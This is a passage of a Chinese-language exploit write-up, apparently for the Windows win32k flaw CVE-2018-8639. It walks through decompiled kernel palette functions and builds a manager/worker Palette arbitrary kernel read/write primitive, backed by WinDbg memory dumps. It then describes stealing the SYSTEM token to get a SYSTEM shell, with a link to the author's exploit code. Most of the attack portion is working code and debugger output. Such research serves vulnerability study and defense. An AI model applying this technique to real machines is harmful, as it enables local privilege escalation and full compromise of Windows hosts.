      buffRef = buff;
      hasData = *(void **)(*(_QWORD *)this->BaseObject + 0x138i64);
      // 如果已经申请过内存
      if ( hasData )
      {
        // 位置140保存了对象的大小
        if ( (unsigned int)CountSize BaseObject + 0x138i64), (const void *)buffRef, 8 * CountSize);
          result = 1i64;
          // 位置140重新保存对象的大小
          *(_DWORD *)(*(_QWORD *)_This->BaseObject + 0x140i64) = CountSize;
          return result;
        }
        if ( hasData && hasData != (void *)(that + 0x114) )
        {
          ExFreePoolWithTag(hasData, 0);
          *(_QWORD *)(*(_QWORD *)_This->BaseObject + 0x138i64) = 0i64;
        }
      }
      if ( (unsigned int)CountSize BaseObject + 0x138i64) = *(_QWORD *)_This->BaseObject + 0x114i64;
        goto copy_Memory;
      }
      AllocedAddress = 0i64;
      size = 8 * CountSize;
      if ( 8 * (_DWORD)CountSize )
      {
        sizeRef = size;
        // 这里分配 8 * CountSize大小内存
        addr = ExAllocatePoolWithTag((POOL_TYPE)33, size, 0x64646147u);
        AllocedAddress = addr;
        if ( addr )
          memset(addr, 0, sizeRef);
      }
      // 在138位置保存了申请内存的地址
      *(_QWORD *)(*(_QWORD *)_This->BaseObject + 0x138i64) = AllocedAddress;
      if ( *(_QWORD *)(*(_QWORD *)_This->BaseObject + 312i64) )
        goto copy_Memory;
      *(_DWORD *)(*(_QWORD *)_This->BaseObject + 0x140i64) = 0;
      return 0i64;
    }
构造好了越界的PALETTE就可以构造hManager、hWorker两个Palette
object,其中hManager->pFirstColor指针指向hWorker的内核地址,具体方法是通过GetPaletteEntries和SetPaletteEntries,内部通过GreGetPaletteEntries调用XEPALOBJ::ulGetEntries和GreSetPaletteEntries调用实现.
    __int64 __fastcall XEPALOBJ::ulGetEntries(PALETTE64 *this, unsigned int istart, unsigned int icount, tagPALETTEENTRY *entrys, int val0)
    {
      unsigned int icountRef; // edi
      tagPALETTEENTRY *v6; // rbx
      unsigned int v8; // eax
      unsigned int v9; // eax
      unsigned __int64 v10; // rcx
      icountRef = icount;
      v6 = entrys;
      if ( !entrys )
        return *(unsigned int *)(*(_QWORD *)this->BaseObject + 0x1Ci64);
      v8 = *(_DWORD *)(*(_QWORD *)this->BaseObject + 0x1Ci64);
      if ( istart >= v8 )
        return 0i64;
      v9 = v8 - istart;
      if ( icount > v9 )
        icountRef = v9;
      // 拷贝pFirstColor+4*istart位置从entry的buf中,拷贝大小为icountRef*4
      memmove(entrys, (const void *)(*(_QWORD *)(*(_QWORD *)this->BaseObject + 0x80i64) + 4i64 * istart), 4i64 * icountRef);
      if ( !val0 )
        return icountRef;
      v10 = (unsigned __int64)&v6[icountRef];
      while ( (unsigned __int64)v6 peFlags = 0;
        ++v6;
      }
      return icountRef;
    }
    __int64 __fastcall XEPALOBJ::ulSetEntries(PALETTE64 *this, unsigned int istart, int icount, tagPALETTEENTRY *entrys)
    {
      __int64 BaseObject; // r10
      tagPALETTEENTRY *entrysRef; // rbx
      PALETTE64 *that; // r11
      __int64 v7; // r9
      _BYTE *ptransOld; // rcx
      tagPALETTEENTRY *entryPtr; // rdi
      _DWORD *ptransCurrentFrom; // rax
      _BYTE *ptransCurrent; // rdx
      _DWORD *ptransOldFrom; // rax
      unsigned int icountRef; // er9
      signed __int32 v14; // edx
      __int64 v15; // r8
      BaseObject = *(_QWORD *)this->BaseObject;
      entrysRef = entrys;
      that = this;
      if ( _bittest((const signed __int32 *)(*(_QWORD *)this->BaseObject + 0x18i64), 0x14u)
        || !entrys
        // BaseObject + 0x1C就是entryCount
        || istart >= *(_DWORD *)(BaseObject + 0x1C) )
      {
        return 0i64;
      }
      if ( icount + istart > *(_DWORD *)(BaseObject + 28) )
        icount = *(_DWORD *)(BaseObject + 28) - istart;
      if ( !icount )
        return 0i64;
      v7 = istart;
      ptransOld = 0i64;
      // 读取pFirstColor+4*istart位置从entry的buf中
      entryPtr = (tagPALETTEENTRY *)(*(_QWORD *)(BaseObject + 0x80) + 4i64 * istart);
      ptransCurrentFrom = *(_DWORD **)(BaseObject + 0x48);
      ptransCurrent = 0i64;
      if ( ptransCurrentFrom )
      {
        *ptransCurrentFrom = 0;
        BaseObject = *(_QWORD *)that->BaseObject;
        ptransCurrent = (_BYTE *)(*(_QWORD *)(*(_QWORD *)that->BaseObject + 0x48i64) + v7 + 4);
      }
      ptransOldFrom = *(_DWORD **)(BaseObject + 0x50);
      if ( ptransOldFrom )
      {
        *ptransOldFrom = 0;
        ptransOld = (_BYTE *)(*(_QWORD *)(*(_QWORD *)that->BaseObject + 0x50i64) + v7 + 4);
      }
      icountRef = icount;
      do
      {
        --icount;
        *entryPtr = *entrysRef;
        if ( ptransCurrent )
          // 重置ptransCurrent
          *ptransCurrent++ = 0;
        if ( ptransOld )
          // 重置ptransOld
          *ptransOld++ = 0;
        // 读取大小为icountRef*4
        ++entrysRef;
        ++entryPtr;
      }
      while ( icount );
      v14 = _InterlockedIncrement((volatile signed __int32 *)&ulXlatePalUnique);
      *(_DWORD *)(*(_QWORD *)that->BaseObject + 32i64) = v14;
      v15 = *(_QWORD *)(*(_QWORD *)that->BaseObject + 136i64);
      if ( v15 != *(_QWORD *)that->BaseObject )
        *(_DWORD *)(v15 + 32) = v14;
      return icountRef;
    }
在poc中对于hManager设置GetPaletteEntries的istart=0x1b,SetPaletteEntries=的istart=0x3C,0x1b
_4=6c对齐后为0x70,0x3C_
4=0xf0,0xf0-0x70=0x80正好是hWorker->pFirstColor指针指向的地址,写入任意目标内核地址后,对于hWorker调用GetPaletteEntries就就可以读取这个地址4*icount大小的任意内容,下面我们来看调试验证结果:
    //在用户态查看,hManager和hWorker可以通过计算公式为(PEB->GdiSharedHandleTable+ sizeof(HANDLEENTRY) *(gdi对象句柄&0xffff))获取内核地址,poc中有计算代码
    0:000> dv /i /t /v
    prv local  00000000`0029f898 unsigned char * hPltWkrObj = 0xfffff900`c566df10 "--- memory read error at address 0xfffff900`c566df10 ---"
    prv local  00000000`0029f890 unsigned char * hPltMgrObj = 0xfffff900`c566de10 "--- memory read error at address 0xfffff900`c566de10 ---"
    //在内核态查看:
    kd> dq 0xfffff900`c566de10 L20
    fffff900`c566de10  00000000`020810cc 00000000`00000000
    //在PALETTE64->cEntries写入值为0xfff位置构造了一个越界的PALETTE实现
    fffff900`c566de20  00000000`00000000 00000fff`00000501
    fffff900`c566de30  00000000`000cfc5d 00000000`00000000
    fffff900`c566de40  00000000`00000000 00000000`00000000
    fffff900`c566de50  00000000`00000000 00000000`00000000
    fffff900`c566de60  00000000`00000000 00000000`00000000
    fffff900`c566de70  fffff960`0010a8dc fffff960`0010a7f0
    fffff900`c566de80  00000000`00000000 00000000`00000000
    //0xfffff900`c566de10+80也就是hManager->pFirstColor指针指向的地址
    fffff900`c566de90  fffff900`c566dea0 fffff900`c566de10
    //查看hManager->pFirstColor指针指向的地址
    kd> dq fffff900`c566dea0 L20
    fffff900`c566dea0  55555555`55555555 55555555`55555555
    fffff900`c566deb0  55555555`55555555 55555555`55555555
    fffff900`c566dec0  55555555`55555555 55555555`55555555
    fffff900`c566ded0  55555555`55555555 55555555`55555555
    fffff900`c566dee0  55555555`55555555 55555555`55555555
    fffff900`c566def0  55555555`55555555 00000000`00000000
    fffff900`c566df00  38326847`23100010 00000000`00000000
    //fffff900`c566dea0+0x70=0xfffff900`c566df10 正好就是在用户态看到的hPltWkrObj指向地址
    //这里正好对应的是一个PALETTE结构
    fffff900`c566df10  00000000`020810cd 00000000`00000000
    //hWorker长度16足够了
    fffff900`c566df20  00000000`00000000 00000016`00000501
    fffff900`c566df30  00000000`000cdb62 00000000`00000000
    fffff900`c566df40  00000000`00000000 00000000`00000000
    fffff900`c566df50  00000000`00000000 00000000`00000000
    fffff900`c566df60  00000000`00000000 00000000`00000000
    fffff900`c566df70  fffff960`0010a8dc fffff960`0010a7f0
    fffff900`c566df80  00000000`00000000 00000000`00000000
    //0xfffff900`c566df10+80指向这里指向要读取内存的地址,也就是hWorker->pFirstColor指针指向的地址
    fffff900`c566df90  fffff800`03eff030 fffff900`c566df10
    fffff900`c566dfa0  55555555`55555555 55555555`55555555
    fffff900`c566dfb0  55555555`55555555 55555555`55555555
    //再次回到用户态查看
    0:000> dv /i /t /v
    prv param  00000000`0029f6b0 unsigned int64 Addr = 0xfffff800`03eff030
    prv param  00000000`0029f6b8 unsigned int len = 2
    //内核态查看
    //直接查看内核态数据
    kd> dq fffff800`03eff030
    fffff800`03eff030  fffffa80`018cbb30 fffffa80`01829fc0
    fffff800`03eff040  a1993ffe`00000001 fffffa80`0195f7b0
    fffff800`03eff050  fffffa80`01852840 00000001`00000000
    fffff800`03eff060  00000000`0007ff8e 00000040`00000320
    fffff800`03eff070  00000043`00000004 fffff683`ffffff78
    fffff800`03eff080  00026161`00000001 00000000`0007ffff
    fffff800`03eff090  fffff800`03c4e380 00000000`00000007
    fffff800`03eff0a0  fffffa80`018fda50 fffffa80`01808000
    //最后回到用户态查看
    0:000> dv /i /t /v
    //验证读取的数据正确
    prv local  00000000`0029f6d0 unsigned int64 res = 0xfffffa80`018cbb30
同理对hWorker调用SetPaletteEntries实现任意内存写入,实现替换进程SYSTEM权限的token,为了避免退出进程后HDC句柄释放失败导致蓝屏,把Palette改回原来大小这样就会调用GetPaletteEntries失败,从而判断出是哪个HDC改写了越界Palette,最后通过偏移量找到他内核句柄的地址,清零最后成功退出exp,成功后获得一个system的cmd,本exp成功率90%,效果如图:
> 引用
[我的poc地址](https://gitee.com/cbwang505/CVE-2018-8639-EXP "poc")